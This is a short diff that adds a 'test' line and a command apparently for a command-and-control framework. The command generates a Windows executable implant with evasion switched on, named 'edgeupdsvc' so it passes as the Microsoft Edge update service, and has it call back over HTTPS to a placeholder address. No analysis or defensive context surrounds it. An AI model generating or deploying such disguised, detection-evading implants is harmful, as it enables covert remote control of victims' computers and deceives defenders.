@@ -1,0 +1,10 @@
+test
+
+generate --os windows \
+  --arch amd64 \
+  --format exe \
+  --evasion \
+  --disable-sgn \
+  --name edgeupdsvc \
+  --http https://ip:port \
+  --save /tmp/edgeupdsvc.exe
